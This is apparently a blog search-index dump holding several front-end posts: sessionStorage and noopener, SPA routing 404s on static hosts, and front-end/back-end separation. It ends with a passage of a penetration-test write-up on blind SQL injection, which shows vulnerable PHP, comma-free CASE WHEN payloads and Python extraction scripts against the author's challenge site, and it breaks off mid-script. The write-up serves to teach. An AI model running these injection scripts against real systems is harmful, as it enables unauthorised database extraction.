target=_blank implies rel=&quot;noopener&quot;, it also does not support noopener not copying sessionStorage. The only browser that conforms to the latest standard is Firefox. If you add rel=&quot;noopener&quot;, sessionStorage will not be copied over. Since these are behaviors that have not yet been corrected by browsers, we are powerless in development. For now, in Chrome and Safari, opening a new tab in the same origin using &lt;a target=&quot;_blank&quot;&gt; will copy sessionStorage. One last reminder: the behavior of “clicking a link” and “right-click -&gt; open in new tab” is different. The former will copy sessionStorage, but the latter will not. This is because the browser (at least Chrome and Safari) thinks that “right-click -&gt; open in new tab” is like opening a new tab and copying and pasting the URL, rather than directly linking from the existing tab, so it will not copy sessionStorage. Once again, here is the demo from the beginning. Try it yourself: https://aszx87410.github.io/demo/session_storage/index.html For related discussions, please refer to: Issue 165452: sessionStorage variables not being copied to new tab. ConclusionStarting from sessionStorage and extending outward, we have explored many new things, and even linked to the article on the security of noopener that I saw a few years ago, as well as the eslint warning I encountered when writing code before. If you want to continue linking, you can even link to Chrome’s recent changes to Referer. So even though it’s just a seemingly small piece of knowledge, there is a whole big knowledge map behind it. After discovering that the spec and implementation were different, I instantly realized the feeling of “trust the book rather than having no book”. I always thought that the spec was the only authority, but I ignored the fact that the spec would constantly change and update, but the implementation might not keep up. Another point is that the implementation of the browser sometimes does not follow the spec due to some considerations, which is also something to be particularly aware of in the future. After going through such a journey, I have a deeper understanding of sessionStorage. If there is a chance in the future, it is better to flip through all the HTML specs, and there should be more interesting things to see. References: HTML spec About rel&#x3D;noopener, what problems does it solve? target&#x3D;_blank rel&#x3D;noreferrer implies noopener Windows opened via a target&#x3D;_blank should not have an opener by default Issue 898942: Anchor target&#x3D;_blank should imply rel&#x3D;noopener Issue 771959: Do not copy sessionStorage when a window is created with noopener Issue 165452: sessionStorage variables not being copied to new tab","link":"/2020/09/05/en/session-storage-and-html-spec-and-noopener/"},{"title":"Common Problems for Beginners Learning SPA: Router Example","text":"IntroductionIn recent years, front-end frameworks have been flourishing, and many beginners who have just learned JavaScript have directly learned the three major frameworks (although React is not a framework, the entire ecosystem is actually no different from the framework, so I think it can be classified as a framework). These three major frameworks are usually used to write SPA (Single Page Application). I have always believed that some basic knowledge should be possessed before learning these frameworks, especially the understanding of front-end and back-end. Otherwise, you will definitely encounter many problems that you don’t know where to start. Therefore, this article uses a problem that I have encountered myself and that students often come to ask me as an example. You can also think about whether you can answer this question: Suppose I have an SPA, using a library of some routers to implement routing, so /list will go to the list page, and /about will go to the about me page. But strange, when I uploaded the SPA to GitHub Pages, the homepage is good, and when I go to /list from the homepage, it is also good, but when I refresh /list, it shows 404 not found. Why is this? To answer this question, you must first review some basic knowledge related to front-end and back-end networks. Dynamic and Static Web PagesFirst of all, what do you think dynamic and static web pages are? What is the difference between them? When we talk about dynamic and static, what we are actually talking about is not whether the content on the webpage will change. It refers to whether the webpage I requested has been “processed” by the server. This definition may not be accurate, but you will understand it when I give a few examples below. Let’s start with the simplest example. Suppose there is a file called a.php, and the code is like this: &lt;?php echo \"hello!\"; ?> If I visit a.php today and see the content like this: &lt;?php echo &quot;hello!&quot;; ?&gt; What does it mean? It means that this is a “static webpage”, and the server did not process this file with PHP-related programs, but returned this a.php as a “file”, which is commonly known as a static file. If we see the content like this: hello! It means that the server executed this a.php and returned the output as a response. This type of webpage is called a “dynamic webpage”. Although the content has not changed, it is indeed a dynamic webpage. This is the difference between dynamic and static. In fact, it has nothing to do with whether the content you see will change. Static will directly return the requested resource as a file, and dynamic will return the result as a response after processing on the server. To ensure that you fully understand this concept, let’s take a look at this example, index.html: &lt;!DOCTYPE html> &lt;html> &lt;head> &lt;meta charset=\"UTF-8\"> &lt;/head> &lt;body> &lt;/body> &lt;script> document.writeln(new Date()) &lt;/script> &lt;/html> Is this a dynamic or static webpage? The answer is static. Because this is a static HTML file, it is not specially processed by the server and is directly transmitted to the client. The content seen by the client is the content of the file stored on the server. Although the information on the screen will change, as I said before, this is not the standard for distinguishing dynamic or static. After talking about dynamic and static, let’s talk about the way the server handles requests. Server and PathWhat is the most common type of URL you see? It is like a file, such as GitHub Pages: http://aszx87410.github.io/mars-lang-chrome-extension/index.html, the latter part mars-lang-chrome-extension/index.html represents that there is an index.html file under the mars-lang-chrome-extension folder. This URL somewhat reflects the real file path, so accessing any page is similar to accessing a file. But these can actually be adjusted through server settings! This means that if I want to, I can make https://huli.tw/123 output the file located on my server at /data/test.html. All of these can be adjusted. Therefore, the URL and the real file path can be similar or completely different, and these can be adjusted on the server. Generally, there are two types of servers related to files. The first is a “completely static” static file server, which means that no matter what file it is, it will not be processed, and it will correspond to the file path. Whatever the file is, it will output the content. The most classic example is GitHub Pages. No matter if you put PHP, Ruby, or JavaScript, it will only output the “file content” as it is, without executing the script. Therefore, you cannot run anything related to the server on GitHub Pages. You cannot run PHP, Rails, or Express because it will not process anything and will only return the file content. The second type is the classic Apache Server, usually used with PHP. It will execute the PHP file before returning the result. Files other than PHP are treated as static files, just like GitHub Pages. Going back to our example, if you have a file called a.php with the content: &lt;?php echo \"hello!\"; ?> If you upload this file to GitHub Pages, you will only see the above content because it is just a file. But if you put this file on a Server with Apache + PHP, you will see hello! because the Server executes this PHP before outputting the result. Now that we have these basics, we can naturally solve the first problem. Suppose I have an SPA that uses a router library to implement routing, so /list will go to the list page, and /about will go to the about me page. But strange enough, when I upload the SPA to GitHub Pages, the homepage is fine, and when I go to /list from the homepage, it is also fine. But when I refresh /list, it shows 404 not found. Why is that? As mentioned earlier, GitHub Pages is a completely static server, and the URL corresponds to the real file path. So when you access the root directory /, the default setting will look for /index.html, so you can access the file normally. But when you visit /list, you don’t have /list/index.html on your GitHub, so of course, it will show 404 not found, which is not very reasonable, right? At this point, you must ask: Then why is it okay when I go from the homepage to the list page? To answer this question, let’s take a look at how SPA routing is implemented. SPA Router ImplementationDo you remember the definition of SPA? Single Page means it never changes pages and always stays on the same page. But if you can’t change pages, isn’t the URL the same? Isn’t that very inconvenient? I just need to refresh, and I will return to the starting point, standing dumbly in front of the mirror, and return to the same page. Is there a way that looks like changing pages but doesn’t really change pages? Yes! That is to add a # after the URL and then change what is behind it! For example, it was index.html, and switching to the list page becomes index.html#list, and the about me page is index.html#about. Isn’t that good! The result looks like this: Example here, the complete code is as follows: &lt;!DOCTYPE html> &lt;html> &lt;head> &lt;meta charset=\"UTF-8\"> &lt;style> .page &#123; display: none; &#125; &lt;/style> &lt;/head> &lt;body> &lt;nav> &lt;a href=\"#home\">home&lt;/a> | &lt;a href=\"#list\">list&lt;/a> | &lt;a href=\"#about\">about&lt;/a> &lt;/nav> &lt;div class=\"page home-page\">I am homepage&lt;/div> &lt;div class=\"page list-page\">I am list&lt;/div> &lt;div class=\"page about-page\">About me &lt;/div> &lt;/body> &lt;script src=\"https://code.jquery.com/jquery-1.12.4.min.js\">&lt;/script> &lt;script> function changePage(hash) &#123; $('.page').hide() if (hash === '#home') &#123; $('.home-page').show() &#125; else if (hash === '#list') &#123; $('.list-page').show() &#125; else if (hash === '#about') &#123; $('.about-page').show() &#125; &#125; // 初始化 changePage(location.hash) // 每當 hash 變動的時候 window.addEventListener(\"hashchange\", function() &#123; changePage(location.hash) &#125;); &lt;/script> &lt;/html> Use # after the URL to distinguish where you are, and this is the hashRouter mentioned in react-router. But this way, the URL becomes ugly, and it is different from other people’s URLs, and there will be a hashtag. Is there a way to make the hashtag disappear? Yes! That is to use the History API provided by HTML5, which allows you to manipulate the URL bar with JavaScript without really changing pages. In the paragraph below the “pushState() method example” on MDN, it is written as follows: Suppose http://mozilla.org/foo.html executes the following JavaScript: var stateObj &#x3D; { foo: “bar” };history.pushState(stateObj, “page 2”, “bar.html”); This will make the URL bar display http://mozilla.org/bar.html, but it will not cause the browser to load bar.html or even check if bar.html exists. The key is this sentence: “but it will not cause the browser to load bar.html.” Even if the URL changes, as long as the browser does not load other pages, it is not called “changing pages.” Therefore, SPA never means “the URL cannot change,” but cannot load other pages. This point must be clear. Example: Here’s the complete code: &lt;!DOCTYPE html> &lt;html> &lt;head> &lt;meta charset=\"UTF-8\"> &lt;style> .page &#123; display: none; &#125; .home-page &#123; display: block; &#125; &lt;/style> &lt;/head> &lt;body> &lt;nav> &lt;span onclick=\"changePage('home')\">home&lt;/span> | &lt;span onclick=\"changePage('list')\">list&lt;/span> | &lt;span onclick=\"changePage('about')\">about&lt;/span> &lt;/nav> &lt;div class=\"page home-page\">I am homepage&lt;/div> &lt;div class=\"page list-page\">I am list&lt;/div> &lt;div class=\"page about-page\">About me &lt;/div> &lt;/body> &lt;script src=\"https://code.jquery.com/jquery-1.12.4.min.js\">&lt;/script> &lt;script> function changePage(page) &#123; $('.page').hide() if (page === 'home') &#123; $('.home-page').show() &#125; else if (page === 'list') &#123; $('.list-page').show() &#125; else if (page === 'about') &#123; $('.about-page').show() &#125; // 精華所在 history.pushState(null, null, page) &#125; &lt;/script> &lt;/html> When switching pages, we use pushState to change the URL, so the URL changes, but the new page is not actually loaded. It’s perfect! After filling in this knowledge, we can finally answer the first question. When we implement SPA, we use pushState to change the URL in the front-end, allowing us to update the address bar using JavaScript without actually loading the resource. But what if we refresh the page? That means we need to load that resource directly! And the server doesn’t have that file, so of course it will return a 404 not found error. The reason why it works when we enter from the homepage is that from the homepage to the list page, we only use pushState to change the URL from / to /list. But if we refresh /list directly, it means that the browser will send a request to /list for data, and naturally it will return a 404 not found error. So how do we solve this problem? On GitHub Pages, you can set a custom 404 page, and you can set this 404 page to be your index.html, so no matter what the URL is, it will return index.html. I uploaded a small demo here, and the code is here: https://github.com/aszx87410/spa-problem-demo, which is just copying the content of index.html to 404.html. Alternatively, you can refer to this: rafrex&#x2F;spa-github-pages, which uses a different method. If you’re using nginx, just try index.html for all paths: location &#x2F; &#123; try_files $uri &#x2F;index.html; &#125; Apache can refer to the configuration found on the internet: SPA - Apache, Nginx Configuration for Single Page Application like React.js on a custom path, which also redirects all paths to index.html. ConclusionWhen I first encountered this part, I was also confused and spent a lot of time understanding the difference between front-end and back-end routers. I found that I needed some basic knowledge to solve this problem. If you don’t know that the front-end router is implemented using the History API, you will naturally find it confusing. And for beginners, all the problems are intertwined and it’s hard to break them down one by one, so it’s hard to find the answer to the problem. I hope this article can help beginners understand what “no page switching” means in front-end SPA and how it is implemented.","link":"/2019/09/18/en/spa-common-problem-about-router/"},{"title":"Front-end Separation and SPA","text":"PrefaceThis post (You go your way, I’ll go mine: Front-end Separation) is one of the articles I wrote for the iT Ironman Contest. After receiving some feedback, I decided to revise and clarify the article. If you have the following questions, this article is perfect for you: Why does the front-end have MVC? What is the difference between front-end MVC and back-end MVC? Why do we need SPA (Single Page Application)? (Actually, there are many discussions about what MVC is, but since this article is not focused on that, I won’t go into detail. If you are interested, you can refer to: MVC is a big misunderstanding) Let’s start with the familiar processIf you want to write a simple blog, what would you do? The answer is simple. You can choose a framework you like, such as Rails, Laravel, etc., define several URLs, design the DB schema, and start coding. For example, for the homepage, you retrieve all the articles from the DB, put the data into the view, and render it. In summary, the process is like this: When you want to access the article list page, the browser sends a request to the server, and then the controller and model process the data and pass it to the view. The view returns a complete HTML file (this action is called rendering), and the browser displays it. Since rendering is done on the server-side, it is also called server-side rendering. This process should be the most familiar to you because many web pages are done this way. In this situation, a front-end engineer is responsible for everything under the view folder and must use the template provided by the framework to integrate the data with HTML. When he needs to debug, he must run the entire project to see the output. This workflow makes it difficult to separate the front-end and back-end. After all, the front-end engineer still needs to know how to run Rails, set up the DB, and maybe even configure Nginx! Although the current method separates the data (Model) and display (View), they are still on the back-end. Is there a better way? Is there a way to let the back-end focus on providing data and the front-end focus on displaying data? Yes! Client-side renderingWe just mentioned server-side rendering, where the back-end directly returns the entire HTML, and the browser displays it because the response is the complete web page. But since we distinguish between server and client, there is another way called client-side rendering. What is it? Everyone knows that JavaScript can dynamically generate content, and client-side rendering means that when the front-end receives the data, it uses JavaScript to dynamically fill in the content on the web page. It’s easier to understand with the code: First, our server now only focuses on providing data, so we open an API: // Homepage, output all messages directly app.get('/', function (req, res) &#123; // Retrieve all messages from the database db.getPosts(function (err, posts) &#123; if (err) &#123; res.send(err); &#125; else &#123; // Directly send all posts out res.send(&#123; posts: posts &#125;); &#125; &#125;) &#125;); If you open the URL of this API in a browser, you should see JSON data: &#123; \"posts\": [ &#123; \"_id\": \"585f662a77467405888b3bbe\", \"author\": \"huli\", \"content\": \"2222\", \"createTime\": \"2016-12-25T06:24:42.990Z\" &#125;, &#123; \"_id\": \"585f662777467405888b3bbd\", \"author\": \"huli\", \"content\": \"1111\", \"createTime\": \"2016-12-25T06:24:39.601Z\" &#125; ] &#125; The backend part is ready and providing data smoothly. Now let’s take a look at the frontend, which only needs an index.html file. &lt;!DOCTYPE html> &lt;html> &lt;head> &lt;link rel=\"stylesheet\" href=\"https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css\" /> &lt;script src=\"https://code.jquery.com/jquery-1.12.4.min.js\">&lt;/script> &lt;script> $(document).ready(function() &#123; getPosts(); &#125;) // ajax fetches the posts function getPosts() &#123; $.ajax(&#123; url: 'http://localhost:3000/', success: function(response) &#123; if (!response.posts) &#123; return alert('Error'); &#125; for(var i = 0; i &lt; response.posts.length; i++) &#123; // pass to the render function addPost(response.posts[i]); &#125; &#125;, error: function(err) &#123; console.log(err); alert('Fetch failed'); &#125; &#125;) &#125; function addPost(post) &#123; var item = '' + '&lt;div class=\"panel panel-default\">' + '&lt;div class=\"panel-heading\">' + '&lt;h3 class=\"panel-title\">' + post.author +', Post Time：' + post.createTime + '&lt;/h3>' + '&lt;/div>' + '&lt;div class=\"panel-body\">' + post.content '&lt;/div>' + '&lt;/div>'; $('.posts').append(item); &#125; &lt;/script> &lt;/head> &lt;body> &lt;div class=\"container\"> &lt;a class=\"btn btn-primary\" href=\"/posts\">Post a new message&lt;/a> &lt;h2>Message List&lt;/h2> &lt;div class=\"posts\"> &lt;/div> &lt;/div> &lt;/body> &lt;/html> Then open index.html, and you can see the expected interface, which should be exactly the same as the one we generated with server-side rendering. If you right-click and inspect, you will find that all elements are there. However, if you right-click and view the source code, you will find that it is almost empty: This is the biggest difference between client-side rendering and server-side rendering. For the former, we are “dynamically” fetching data from the backend server during runtime and dynamically generating the elements you see. Those elements did not originally exist in index.html. We appended them ourselves using jQuery, so of course, nothing will appear when you view the source code. Let’s take a look at a client-side rendering diagram: In the server-side, the view layer is ignored because the backend only outputs data in JSON format. The fifth step here, rendering the returned data into HTML, refers to the step where we used jQuery to dynamically append the data. In this situation, have you noticed that the front-end and back-end have been separated? After this, the backend engineer no longer needs to worry about what is in the view, nor does he need to teach the front-end engineer how to run Rails. He only needs to be responsible for creating API documents and providing the data needed by the front-end. The front-end engineer no longer needs to run those services either. They only need to open the HTML file in their familiar browser, use AJAX to get data from the backend, and dynamically generate content on their end using JavaScript. In this scenario, the deployment of the front-end and back-end can also be completely separated. The front-end part is the simplest, just find a place to store the HTML file, such as Amazon S3. Therefore, the front-end hardly has any problems, nor does it have any traffic issues, because it is just a static file. If the server crashes one day and the API crashes with it, users can still visit the website, they just won’t see any data, or you can display an error message. But if it’s the old type of architecture where everything is tied together, once the server crashes, you can’t even render the page. Furthermore, because data and view are now completely separated, it is very convenient to replace either side. For example, if you don’t want to use Rails on the backend anymore and want to use Go, it’s no problem! As long as the API format is the same, the backend can use C if they want to. The front-end is the same, you can choose Angular, React, or Vue, or even hand-code it, it’s not the backend engineer’s concern. However, things are not that simpleAlthough this scenario sounds great, don’t overlook the consequences of such changes. What consequences? The front-end will become very complex. Think about the development architecture we mentioned at the beginning, where everything is rendered from the backend. So I prepare a view file for each page, if the user visits /posts, I render (&#39;posts.ejs&#39;); if they visit /about, I render (&#39;about.ejs&#39;). The first problem arises: Since we just said that the front-end only has one index.html, doesn’t that mean that visiting /posts and visiting /about both go to the same file? How do I render different pages? Because in the past, the routing part was handled by the server, as I mentioned earlier, the server decides which page to render based on different routes. But now that it’s separated, the front-end only has one index.html, so what do we do? We have to let the front-end handle it. The front-end can manage the URL by using window.location or the history API to know which page the user wants to visit. Here’s a small detail to mention: as I just mentioned, the front-end only has one HTML file, so the URL might look like this: https://example.com/index.html. There’s only one URL, how do we know which page the user wants to visit? In the past, if we wanted to visit posts, the URL might be: https://example.com/posts, but now that the front-end has become a static file, there’s only that one path, what do we do? The first method is to use a hash, for example, https://example.com/index.html#posts, and then the front-end can parse the string after it. The second method is to use nginx or other similar services to output the index.html file for all https://example.com/* URLs, so it looks like it did before. If I go to /posts, the server will return index.html, and if I go to /about, the server will return the same content. Anyway, because the backend no longer handles the routing here, this part is completely handed over to the front-end. You must manage the URL state on the front-end to decide which page to display. So how do we do this? The simplest way is to do it the same way as the backend did before. Wherever you go, I’ll output what you need based on the URL. The front-end code might look like this: function render(path) &#123; // Clear the entire screen $(body).empty(); if (path === 'posts') &#123; renderPostsPage(); &#125; else if (path === 'about') &#123; renderAboutPage(); &#125; &#125; As long as I go to a new URL, I just clear the current content and render it again. It’s simple, but there is a big performance issue because some parts don’t need to be cleared. For example, the navigation bar at the top and the footer at the bottom of the website are basically the same on every page and won’t change. For those unchanging parts, they should be preserved, otherwise it’s very inefficient to clear and rebuild the same thing every time. You might say that this is like the old way of writing views on the backend, where common parts are extracted and put in the layout. No, this is different. Backend rendering is essentially “returning a different HTML file for each different page,” and what we are doing now on the frontend is also extracting common parts, but the difficulty on the frontend is “how to update only part of the screen, rather than brutally chopping and rebuilding every time.” Have you started to feel that there are more and more things to do on the frontend? Single Page ApplicationWhen you take this thing to the extreme, it feels like you’re writing an app, and this thing is called an SPA, Single Page Application. Just as the name suggests, we now only have one index.html file, but it works like an app. The most classic example is Gmail. When you use Gmail, there is no page switching. All actions happen on the “same page,” so the file you load from start to finish is only one index.html, and you never switch pages. Any action you take on Gmail sends an ajax request to the server, and after the server returns the data, the client side uses JavaScript to render the screen. So when you use Gmail, you feel like you’re using an app instead of a webpage, because the page transitions are smooth, unlike regular webpages where there may be white screens in between. Since it’s called an Application, frontend engineers at this point are no longer just expected to know how to use HTML and CSS to draw screens, and use JavaScript to add small effects and interactions. The hardest part of writing an SPA is managing the state. Because many things were done for you on the backend, you didn’t have to consider this at all, but now you do. For example, in the past, when you visited an article, let’s say /post/12, and quickly switched back to the homepage and clicked on another article, the server would only return the corresponding HTML. But with an SPA, consider the following process: User clicks /post/12 Query API User returns to homepage User clicks /posts/13 Query API Get response and render page Assuming the user clicks quickly, at step 7, it is very likely that they will get the response from step 2 first, and the user will end up seeing the content of article B even though they clicked on article A. This is just a simple example, and in practice there are many other issues to consider, such as what to display when data hasn’t been retrieved yet, and how to update after data has been retrieved. Frontend MVCAs the frontend becomes more and more complex, you should also understand why the frontend needs MVC. If you have written pure PHP and experienced the period when business logic, view, and model were mixed together in the same file, you should also understand why MVC is needed. Because we need to separate responsibilities, so that everyone is responsible for what they should be responsible for, and not everything is mixed together like spaghetti. Frontend MVC is actually quite similar to backend MVC, and we also need to set up routes, as mentioned earlier. That is, set which URL goes to which controller, then go to the corresponding model to get data, and finally output the view. Here’s a comparison of what frontend and backend MVC do: &amp;nbsp; Frontend Backend Model Go to the backend API to get data Go to the DB to get data View Dynamically generate screens on the frontend None Controller Call the corresponding model and render the screen Call the corresponding model and return data You’ll find that what the frontend and backend do is pretty much the same, except that the frontend focuses on rendering screens and the backend focuses on outputting data. You can also draw a complete flowchart: To explain it in words, the process is as follows: The user visits the &#x2F;posts URL, indicating that they want to see all the articles. The front-end router handles this and calls the corresponding controller. The front-end controller calls the model to get the data. The front-end model gets the data through the API at the &#x2F;api&#x2F;posts URL. The back-end router receives the request and sends it to the corresponding back-end controller. The back-end controller and model get the data. The back-end controller returns the data. The front-end model receives the data and returns it to the front-end controller, which then passes it to the view. The client-side render renders the page. This is basically the most basic structure of a SPA. The back-end only outputs data, while the front-end is responsible for fetching data and rendering the page. By completely separating the front-end and back-end, even if the back-end fails, the front-end can still display the page (although it may display an error page or something similar); if the front-end fails, the back-end can still output data for other services to use. Both sides are clean, and either side is easier to maintain. If a front-end engineer wants to change anything related to the interface, it has nothing to do with the back-end. It’s like two different projects. Do we really need SPA? I think the complexity of front-end development is closely related to SPA, as you are essentially developing a complete app, so how can it not be complex? But don’t forget to ask yourself: Do we really need SPA? Some scenarios require it, such as music playback websites. Why? Because you must be able to play music while browsing other data on the website, such as artist introductions and album introductions. If you don’t use SPA, when the user clicks to another page, the browser will jump to that page and the music will stop. This experience is terrible and completely unacceptable. Therefore, this type of website must use SPA, and there is no other choice. After using it, because there is no page jumping, when you click on the artist introduction, you just send an ajax request, and then use JavaScript to render the received data into HTML and display it. No matter which page you go to, it won’t really jump, and it won’t load a new HTML file. There are some places where I think it’s not necessary, but using it can enhance the user experience, such as Twitch’s new feature a while ago, where when you jump to another page, the live broadcast you were watching will shrink to the lower left corner. In short, there are two scenarios where Single Page Application is needed. One is because it must be done, and the other is because it can enhance the user experience and make the operation smoother. If you find that what you want to do does not fit these two scenarios, you can choose not to use SPA and follow the previous MVC architecture, which is rendered and processed by the server side. All of this is optional. In addition, SPA also has some disadvantages. For example, you clearly only need to look at one page, but you have to download a large package of JavaScript or other page templates. Or because it is client-side rendering, some search engines cannot crawl any data (because your index.html is almost empty), but Google is very powerful and will crawl the results after executing JavaScript. But this is still not good for SEO. Of course, there are some methods to solve the above problems, such as separating the js files, so you only need to download the js file of that page when you go to that page. The solution to SEO is to combine the two. The first time is server-side rendering, and the subsequent operations are changed to client-side rendering, which can ensure that search engines can crawl the complete HTML. But you know, being able to solve it is one thing, and how much effort it takes to solve it is another. In summary, this article roughly talks about the most common website architecture at the beginning, and then SPA, which has led to the complexity of front-end development in recent years. When I first encountered it, I was also confused and wondered why the front-end needed MVC. But after thinking about this series of contexts, it is easy to understand the reason. When things become more and more complicated, you need a structure to cut responsibilities, otherwise it will cause difficulties in maintenance in the future. The more you understand the advantages and disadvantages of SPA, the more aspects you can refer to when choosing whether to use it, and you have more reasons to support the decision you made, rather than just saying “Wow! It’s so trendy! I want to use it too!” I hope this article is helpful to everyone, and finally, here is an extended reading: Why I hate your Single Page App.","link":"/2017/09/06/en/spa-single-page-application/"},{"title":"SQL injection in action: Speeding up under restrictions","text":"Recently, during a penetration test, our team discovered an interesting SQL injection case. Due to some features, we couldn’t directly use existing tools to retrieve data. We had to modify the tools or write scripts to effectively utilize them. Therefore, this article will share two practical cases and my own solutions. I have put these two cases on Heroku and turned them into two small challenges. If you are interested, you can try them out: (The Heroku links are no longer available) The original case was similar to a hotel booking website, so these two challenges are actually functions that a hotel booking website would have. The first one is a search function, and the second one is a room booking query function. The first challenge requires retrieving the flag from a specified table, and the flag in the second challenge is hidden in another table. You need to find that table and retrieve the flag. The flag format is: cymetrics&#123;a-z_&#125;. Because Heroku has an automatic sleep mechanism, it may take five or six seconds to see the screen, which is normal. I don’t think the difficulty of these two questions is high, but the key is how to find more efficient solutions. Below are the explanations of the two cases and my own solutions. Case One: Search FunctionThe first case is a search function. There is a table called “home” that stores three columns: id, name, and tags. Tags are a comma-separated string used to indicate which tags the data has. If nothing is passed in, the following data will be returned: [ &#123; \"id\": \"1\", \"name\": \"home1\", \"tags\": \"1,2,3,4\" &#125;, &#123; \"id\": \"2\", \"name\": \"home2\", \"tags\": \"1,5\" &#125; ] Therefore, we can know that there are two pieces of data in the database. Then we can pass in tag to filter and find the specified data, like this: https://od-php.herokuapp.com/sql/search.php?tag=5 [ &#123; \"id\": \"2\", \"name\": \"home2\", \"tags\": \"1,5\" &#125; ] The tag parameter can be separated by commas to search for multiple values at once, like this: https://od-php.herokuapp.com/sql/search.php?tag=2,5 [ &#123; \"id\": \"1\", \"name\": \"home1\", \"tags\": \"1,2,3,4\" &#125;, &#123; \"id\": \"2\", \"name\": \"home2\", \"tags\": \"1,5\" &#125; ] That’s basically it for the function. The original actual case was a bit more complicated, but for the sake of simplicity, only the most essential parts were kept, and other irrelevant things were removed. Next, let’s take a look at the key code: $sql = \"SELECT id, name, tags from home \"; if (strpos(strtolower($tag), \"sleep\") !== false) &#123; die(\"QQ\"); &#125; if(!empty($tag) &amp;&amp; is_string($tag)) &#123; $tag_arr = explode(',', $tag); $sql_tag = []; foreach ($tag_arr as $k => $v) &#123; array_push($sql_tag, \"( FIND_IN_SET(&#123;$v&#125;, tags) )\"); &#125; if (!empty($sql_tag)) &#123; $sql.= \"where (\" . implode(' OR ', $sql_tag) . \")\"; &#125; &#125; Here, SQL query is composed by string concatenation, so there is an obvious SQL injection vulnerability. If you pass in ?tag=&#39;, the SQL query will fail. For the convenience of debugging, the SQL query will be printed out when an error occurs. A very intuitive way to retrieve other data is to use union, but this trick doesn’t work here because the parameter we pass in is separated by commas, so there can be no commas in our payload, otherwise the entire query will be messed up and become very strange. Therefore, one of the interesting things about this question is how to use this vulnerability without using commas. A simple and intuitive way is to use case when with sleep, like this: (select case when (content like \"c%\") then 1 else sleep(1) end from flag) From the response time of the response, we can infer whether the condition is met or not. However, because the code blocks sleep, we cannot use it in this way (the original case did not block this, but I added it separately). But if you observe carefully, you will find that we don’t need to use sleep. We can use the return value of case when to perform the original filtering function and infer which condition is met from the result, like this: (select case when (content like \"c%\") then 1 else 10 end from flag) When the condition (content like &#39;c%&#39;) is met, the return value is 1, otherwise it is 10. If it is 1, the returned JSON will have data, otherwise it won’t. Therefore, we can know whether the condition is met based on whether there is data or not. Next, let’s write a script for this simplest method. # exploit-search.py import requests import datetime import json host = 'https://od-php.herokuapp.com/sql' char_index = 0 char_set = 'abcdefghijklmnopqrstuvwxyz&#125;_' result = 'cymetrics&#123;' while True: if char_index >= len(char_set): print(\"end\") break char = char_set[char_index] payload = f'(select case when (content like \"&#123;result&#125;&#123;char&#125;%\") then 1 else 10 end from flag)' response = requests.get(f'&#123;host&#125;/search.php?tag=&#123;payload&#125;') print(\"trying\", char) if response.ok: data = json.loads(response.text) if len(data) > 0: result += char print(result) char_index = 0 else: char_index += 1 else: print('error') print(response.text) break Simply put, each character is continuously tested until it is found. It is simple and violent but effective. It takes about three to five minutes to run, and the execution process will be like this: If it is a challenge like this, where we know the table name and column name in advance, the execution time may be longer, but three to five minutes is still within an acceptable range. However, in actual cases, we may not know anything and need to go to the information_schema to retrieve various information before dumping the entire database. Therefore, we need a more efficient approach. Speed up: Try three at onceIn fact, if we observe carefully, we can control four types of return results: home1 and home2 appear together (when the tag is 1) Only home1 appears (when the tag is 2) Only home2 appears (when the tag is 5) Neither of them appear (when the tag is 10) And in the previous attack method, we only used two of these situations. If we use all four, the speed will triple. The way to use it is very simple. We can change from trying one at a time to trying three at a time, like this: (select case when (content like \"a%\") then 1 when (content like \"b%\") then 2 when (content like \"c%\") then 5 else 10 end from flag) One query can try three characters, and the speed is tripled. The script is as follows: # exploit-search-3x.py import requests import datetime import json import urllib.parse import time def print_success(raw): print(f\"\\033[92m&#123;raw&#125;\\033[0m\") def encode(raw): return urllib.parse.quote(raw.encode('utf8')) host = 'https://od-php.herokuapp.com/sql' char_index = 0 char_set = '&#125;abcdefghijklmnopqrstuvwxyz_' result = 'cymetrics&#123;' start = time.time() while True: found = False for i in range(0, len(char_set), 3): chars = char_set[i:i+3] while len(chars) &lt; 3: chars += 'a' payload = f''' (select case when (content like \"&#123;result+chars[0]&#125;%\") then 1 when (content like \"&#123;result+chars[1]&#125;%\") then 2 when (content like \"&#123;result+chars[2]&#125;%\") then 5 else 10 end from flag) ''' print(\"trying \" + str(chars)) response = requests.get(f'&#123;host&#125;/search.php?tag=&#123;encode(payload)&#125;') if response.ok: data = json.loads(response.text) if len(data) == 2: result+=chars[0] found = True elif len(data) == 0: continue else: found = True if data[0][\"name\"] == \"home1\": result+=chars[1] else: result+=chars[2] else: print('error') print(response.text) break if found: print_success(\"found: \" + result) break if not found: print(\"end\") print(response.text) break print(f\"time: &#123;time.time() - start&#125;s\") The result of running it looks like this: It took about 90 seconds to get the answer, which is much faster than before. Assuming n is the length of the string, and our character set has about 27 characters, in the worst case, we need 27n attempts to get the flag. With this method, we only need 27n&#x2F;3 &#x3D; 9n attempts. However, this is still not fast enough. Since we already have three types of results, why not use them in a different way? Further acceleration: Ternary searchInstead of trying three at a time, we can try “three groups of three” by dividing the original character set into three equal parts, such as &#125;abcdefghijklmnopqrstuvwxyz_, which can be divided into: }abcdefgh ijklmnopq rstuvwxyz_ We can check if the character is in a specific group by using the following SQL query: (select case when ( (content like 'cymetrics&#123;&#125;%') or (content like 'cymetrics&#123;a%') or (content like 'cymetrics&#123;b%') or (content like 'cymetrics&#123;c%') or (content like 'cymetrics&#123;d%') or (content like 'cymetrics&#123;e%') or (content like 'cymetrics&#123;f%') or (content like 'cymetrics&#123;g%') or (content like 'cymetrics&#123;h%') ) then 1 when ( (content like 'cymetrics&#123;i%') or (content like 'cymetrics&#123;j%') or (content like 'cymetrics&#123;k%') or (content like 'cymetrics&#123;l%') or (content like 'cymetrics&#123;m%') or (content like 'cymetrics&#123;n%') or (content like 'cymetrics&#123;o%') or (content like 'cymetrics&#123;p%') or (content like 'cymetrics&#123;q%') ) then 2 when ( (content like 'cymetrics&#123;r%') or (content like 'cymetrics&#123;s%') or (content like 'cymetrics&#123;t%') or (content like 'cymetrics&#123;u%') or (content like 'cymetrics&#123;v%') or (content like 'cymetrics&#123;w%') or (content like 'cymetrics&#123;x%') or (content like 'cymetrics&#123;y%') or (content like 'cymetrics&#123;z%') or (content like 'cymetrics&#123;\\_%') ) then 5 else 10 end from flag) Each time it is divided into three equal parts for searching, it becomes a ternary search. In the worst case, the number of attempts required is reduced from 9n to 3n. The script is as follows (the ternary search part is a bit messy and may contain bugs): # exploit-search-teanary.py import requests import time import json import urllib.parse def print_success(raw): print(f\"\\033[92m&#123;raw&#125;\\033[0m\") def encode(raw): return urllib.parse.quote(raw.encode('utf8')) host = 